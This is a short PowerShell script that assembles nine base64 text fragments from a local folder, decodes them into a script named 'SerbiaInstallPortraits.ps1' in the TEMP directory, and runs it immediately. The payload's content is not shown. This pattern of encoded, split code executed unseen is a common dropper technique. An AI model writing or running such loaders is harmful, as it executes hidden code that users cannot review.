$ErrorActionPreference = "Stop"
$here = $PSScriptRoot
$b64 = ""
0..8 | ForEach-Object { $b64 += Get-Content -Raw (Join-Path $here ("ps1_parts\part{0}.txt" -f $_)) }
$bytes = [Convert]::FromBase64String($b64)
$tmp = Join-Path $env:TEMP "SerbiaInstallPortraits.ps1"
[IO.File]::WriteAllBytes($tmp, $bytes)
& $tmp
